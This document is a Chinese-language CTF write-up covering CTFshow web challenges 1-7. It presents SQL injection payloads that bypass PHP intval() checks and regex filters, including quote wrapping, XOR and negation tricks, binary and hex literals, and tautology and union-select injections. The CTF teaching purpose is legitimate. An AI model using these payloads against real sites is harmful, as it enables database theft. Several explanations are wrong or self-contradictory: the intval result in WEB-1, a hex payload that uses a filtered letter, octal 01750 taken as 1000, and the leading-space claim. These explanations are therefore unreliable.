## 概述

本页面系统整理 **CTFshow WEB 入门系列第 1-7 关** 的 SQL 注入绕过核心知识点。题目核心逻辑为：通过 `GET` 参数 `id` 查询文章表，需满足 `intval($id) > 999` 且绕过层层递进的正则过滤，最终构造出等效于 `id=1000` 的 Payload 实现注入。

> **关联页面**：后续第 8-23 关涉及命令执行、文件包含、日志投毒等 RCE 技术，详见 [[ctf-show-php-command-execution-bypass-techniques]]。

## 核心代码模板

所有 1-7 关共享同一骨架，仅正则过滤规则逐关收紧：

```php
<?php
include("config.php");
if(isset($_GET['id'])) {
    $id = $_GET['id'];
    // 正则过滤（各关不同）
    if(preg_match($regex_pattern, $id)) {
        die("id error");
    }
    // 整数值判断
    if(intval($id) > 999) {
        die("id error");
    } else {
        $sql = "select * from article where id = $id order by id limit 1";
        // 执行查询并回显
    }
}
?>
```

**关键约束**：
1. `intval($id) > 999` → 必须绕过整数值判断
2. 正则过滤逐关增强 → 需对应调整 Payload 形式
3. SQL 语句直接拼接 `$id` → 无引号包裹，数值型注入

## 逐关绕过技术演进

### WEB-1：`intval()` 特性初探

**过滤规则**：`/or|\+/i`（过滤 `or`、`+`）

**核心技术**：`intval()` 字符串处理特性
- `intval()` 从字符串起始位置读取数字，遇非数字字符停止
- 起始为非数字则返回 `0`
- 示例：`intval('100a123') = 100`，`intval('a123') = 0`

**Payload**：
```text
?id='1000'
```
- `intval('1000')` → `1000`（不大于 999，通过）
- SQL 拼接：`id = '1000'` → MySQL 隐式转换等同于 `1000`

---

### WEB-2：基础正则绕过

**过滤规则**：`/or|\+/i`（同 WEB-1）

**Payload**：同 WEB-1，单引号字符串绕过 `intval` 判断。

---

### WEB-3：运算符与关键字扩展过滤

**过滤规则**：`/or|\-|\\|\*|\<|\>|\!|x|hex|\+/i`
- 新增过滤：`-` `\` `*` `<` `>` `!` `x` `hex`

**Payload**：`?id='1000'` 仍可用（单引号未被过滤）。

---

### WEB-4：SQL 关键字过滤

**过滤规则**：`/or|\-|\\\|\/|\\*|\<|\>|\!|x|hex|\(|\)|\+|select/i`
- 新增过滤：`/` `(` `)` `select`

**Payload**：`?id='1000'` 仍有效。

---

### WEB-5：引号过滤 → 位运算/进制绕过

**过滤规则**：`/\'|\"|or|\||\-|\\\|\/|\\*|\<|\>|\!|x|hex|\(|\)|\+|select/i`
- **单双引号被过滤**，字符串绕过失效

**绕过方案**：

| 技术类别 | Payload 示例 | 原理说明 |
|----------|--------------|----------|
| **双重取反** | `~~1000` | `~` 按位取反，两次还原 |
| **异或运算** | `200^800` | `^` 未被过滤，结果为 1000 |
| **二进制字面量** | `0b1111101000` | MySQL 支持 `0b` 前缀 |
| **十六进制字面量** | `0x3e8` | MySQL 支持 `0x` 前缀 |

**异或运算详解**：
```
200 (十进制) = 0000 0000 1100 1000 (二进制)
800 (十进制) = 0000 0011 0010 0000 (二进制)
------------------------------------------------
200 ^ 800    = 0000 0011 1110 1000 (二进制) = 1000 (十进制)
```

---

### WEB-6：异或运算符被禁 → 仅剩取反

**过滤规则**：新增过滤 `^`

**可用 Payload**：
- `~~1000`（双重取反）
- `0b1111101000`（二进制）
- `0x3e8`（十六进制）

---

### WEB-7：取反符号被禁 → 进制字面量终极绕过

**过滤规则**：新增过滤 `~`

**唯一可用数值构造**：
- `0b1111101000`（二进制）
- `0x3e8`（十六进制）
- 算术运算组合（见下节）

## 通用绕过技术总结（WEB 1-7 通杀）

### 进制转换

| 进制 | 语法 | 1000 表示 |
|------|------|-----------|
| 二进制 | `0b...` | `0b1111101000` |
| 八进制 | `0...` | `01750` |
| 十六进制 | `0x...` | `0x3e8` |

> MySQL 解析数值字面量时自动识别上述前缀，`intval()` 在 PHP 中**不识别**这些前缀（`intval('0x3e8') = 0`），完美形成差异利用。

### 位运算操作

| 运算 | 示例 | 说明 |
|------|------|------|
| 双重取反 | `~~1000` | 需 `~` 未被过滤 |
| 异或 | `200^800` | 任意 `a^b=1000` 均可 |
| 按位或 | `992\|8` | `992|8 = 1000` |
| 按位与 | `1023&1000` | `1023&1000 = 1000` |

### 算术运算符构造

| 运算 | 示例 | URL 编码注意 |
|------|------|--------------|
| 加法 | `200+800` | `+` → `%2b` |
| 减法 | `2000-1000` | `-` 常被过滤 |
| 乘法 | `200*5` | `*` 常被过滤 |
| 除法 | `10000/10` | `/` 常被过滤 |
| 负负得正 | `--1000` | 双负号 |

### SQL 注入直接构造（绕过 `intval` 逻辑）

利用 `intval('abc') = 0` 特性，配合 SQL 语法：

| Payload | SQL 效果 | 条件 |
|---------|----------|------|
| `1 or 1=1#` | 恒真注入 | 需 `or`、`#` 未被过滤 |
| `0 union select ...` | 联合查询 | 需 `union`、`select` 未被过滤 |

### 绕过 `intval()` 的字符串包裹技巧

| 形式 | `intval()` 结果 | SQL 语法有效性 |
|------|-----------------|----------------|
| `'1000'` | 0 | ✅ 有效 |
| `(1000)` | 0 | ✅ 有效 |
| ` 1000` | 0 | ✅ 有效（前导空格） |

## 实战要点与避坑指南

1. **`intval()` 与 MySQL 解析差异是核心**
   - PHP `intval('0x3e8')` = 0
   - MySQL `0x3e8` = 1000
   - 利用此差异同时满足“整数值 ≤ 999”与“SQL 实际值 = 1000”

2. **URL 编码必须处理**
   - `+` → `%2b`
   - `#` → `%23`
   - 空格 → `%20` 或 `+`

3. **正则大小写不敏感（`/i` 模式）**
   - `SELECT`、`Select` 均会被拦截

4. **MySQL 数值字面量自动转换**
   - `0b1111101000`、`0x3e8`、`01750` 在 SQL 中均为 1000
   - 无需引号包裹，直接拼接进入 SQL

5. **注释符替代方案**
   - `#` → `%23`
   - `-- ` → `--%20`
   - `/* */` → `/**/`
